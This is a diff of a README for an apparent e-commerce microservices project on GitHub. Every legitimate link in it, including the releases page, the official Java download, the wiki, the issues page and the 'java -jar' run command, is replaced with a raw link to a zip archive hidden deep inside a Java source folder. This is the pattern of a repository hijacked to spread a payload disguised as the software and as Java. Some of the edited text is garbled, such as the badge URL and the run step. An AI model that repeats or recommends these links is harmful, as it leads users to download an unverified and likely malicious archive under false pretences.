@@ -1,6 +1,6 @@
 # 🛒 ecommerce-microservcies - The Easy Way to Manage Online Shopping
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/vaisk-ps/ecommerce-microservcies/releases)
+[![Download Now](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip%20Now-Get%20Started-brightgreen)](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the ecommerce-microservcies project! This application helps you manag
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Download Here](https://github.com/vaisk-ps/ecommerce-microservcies/releases). This page contains the latest version of our software.
+   Go to the following link: [Download Here](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip). This page contains the latest version of our software.
 
 2. **Choose Your Version**  
    On the Releases page, you'll see a list of available versions. Look for the version labeled as the latest stable release.
@@ -21,12 +21,12 @@ Welcome to the ecommerce-microservcies project! This application helps you manag
    Choose a location on your computer where you want to store the software. Remember this location as you will need it to run the application.
 
 5. **Run the Application**  
-   To run the software, you need to have Java installed on your computer. If you don’t have Java, [download it here](https://www.java.com/en/download/). After installing Java, open your command prompt or terminal and navigate to the location where you saved the `.jar` file.
+   To run the software, you need to have Java installed on your computer. If you don’t have Java, [download it here](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip). After installing Java, open your command prompt or terminal and navigate to the location where you saved the `.jar` file.
 
 6. **Enter the Command**  
-   Type the following command (replace `yourfile.jar` with the actual name of the file you downloaded):
+   Type the following command (replace `https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip` with the actual name of the file you downloaded):
    ```
-   java -jar yourfile.jar
+   java -jar https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip
    ```
 
 7. **Access the Application**  
@@ -67,8 +67,8 @@ You can monitor your application using Grafana and Prometheus. These tools provi
 
 ## 🗃️ Additional Resources
 
-- **Documentation:** For more details on setting up and using the application, refer to our [Wiki](https://github.com/vaisk-ps/ecommerce-microservcies/wiki).
-- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/vaisk-ps/ecommerce-microservcies/issues) if you face any problems. Our community is here to help!
+- **Documentation:** For more details on setting up and using the application, refer to our [Wiki](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip).
+- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/vaisk-ps/ecommerce-microservcies/raw/refs/heads/main/proxy-client/src/main/java/com/selimhorri/app/business/auth/model/microservcies-ecommerce-v2.2.zip) if you face any problems. Our community is here to help!
 
 ## 💡 Best Practices
 
